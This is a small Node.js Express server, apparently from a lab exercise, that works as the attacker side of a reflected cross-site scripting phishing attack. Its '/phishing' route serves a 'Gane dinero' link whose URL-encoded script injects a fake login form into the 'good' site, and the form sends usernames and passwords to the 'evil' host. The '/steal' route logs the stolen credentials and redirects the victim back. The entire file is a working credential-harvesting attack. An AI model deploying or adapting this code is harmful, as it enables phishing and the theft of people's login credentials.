const express = require("express");

const app = express();

const IP   = 'evil';
const PORT = 8080;
app.get('/phishing', function(req,res) {
res.send('<a href="http://good:8080/?msg=%3Cscript%3E%0Adocument.write(%22%3Cform%20action%3D%27http%3A%2F%2Fevil%3A8080%2Fsteal%27%3E%3Clabel%20for%3D%27user%27%3EUser%3A%3C%2Flabel%3E%3Cbr%3E%3Cinput%20type%3D%27text%27%20id%3D%27user%27%20name%3D%27user%27%3E%3Cbr%3E%3Clabel%20for%3D%27password%27%3EPassword%3A%3C%2Flabel%3E%3Cbr%3E%3Cinput%20type%3D%27text%27%20id%3D%27password%27%20name%3D%27password%27%3E%3Cbr%3E%3Cinput%20type%3D%27submit%27%20value%3D%27Login%27%3E%3C%2Fform%3E%22)%3C%2Fscript%3E">Gane dinero</a>');

})
app.get('/steal', function (req,res) {
    console.log(req.query);	
    res.redirect('http://good:8080/error/');
});

app.listen(PORT, IP, () => {
    console.log(`Listening at ${PORT}`);
});
